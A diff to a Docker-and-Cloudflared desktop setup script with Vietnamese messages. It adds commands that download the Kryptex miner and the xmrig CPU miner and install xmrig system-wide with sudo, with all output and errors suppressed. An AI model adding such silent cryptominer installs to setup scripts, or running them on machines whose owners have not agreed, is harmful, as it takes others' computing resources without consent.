@@ -60,18 +60,25 @@
       echo "Đang chờ container sẵn sàng..."
       while ! nc -z localhost 10000; do sleep 1; done
 
-      # Install Chrome and Wine (to run .exe files)
-      echo "Đang cài đặt Chrome và Wine (để chạy file .exe)..."
+      # Install Chrome, Wine, and Mining software
+      echo "Đang cài đặt Chrome, Wine và phần mềm mining..."
       docker exec -it "$CONTAINER_NAME" bash -lc "
         sudo apt update -qq &&
         sudo apt remove -y firefox 2>/dev/null || true &&
-        sudo apt install -y wget wine64 wine32 winetricks -qq &&
+        sudo apt install -y wget curl wine64 wine32 winetricks build-essential git -qq &&
         sudo wget -q -O /tmp/chrome.deb https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb &&
         sudo apt install -y /tmp/chrome.deb -qq &&
         sudo rm -f /tmp/chrome.deb &&
         winecfg &>/dev/null || true &&
-        winetricks -q corefonts vcrun2019 2>/dev/null || true
-      " 2>/dev/null || echo "Installation skipped or already done"
+        winetricks -q corefonts vcrun2019 2>/dev/null || true &&
+        # Download Kryptex Miner (Windows .exe)
+        mkdir -p ~/mining/kryptex &&
+        cd ~/mining/kryptex &&
+        wget -q https://files.kryptex.com/kryptex-latest.exe -O kryptex.exe 2>/dev/null || echo 'Kryptex download skipped' &&
+        # Install xmrig (CPU miner) for Kryptex Pool
+        wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz -O /tmp/xmrig.tar.gz 2>/dev/null || echo 'xmrig download skipped' &&
+        cd /tmp && tar -xzf xmrig.tar.gz 2>/dev/null && sudo mv xmrig-*/xmrig /usr/local/bin/ 2>/dev/null && sudo chmod +x /usr/local/bin/xmrig 2>/dev/null || true
+      " 2>/dev/null || echo "Installation completed or skipped"
 
       # Run Cloudflared tunnel
       echo "Đang khởi động Cloudflared tunnel..."
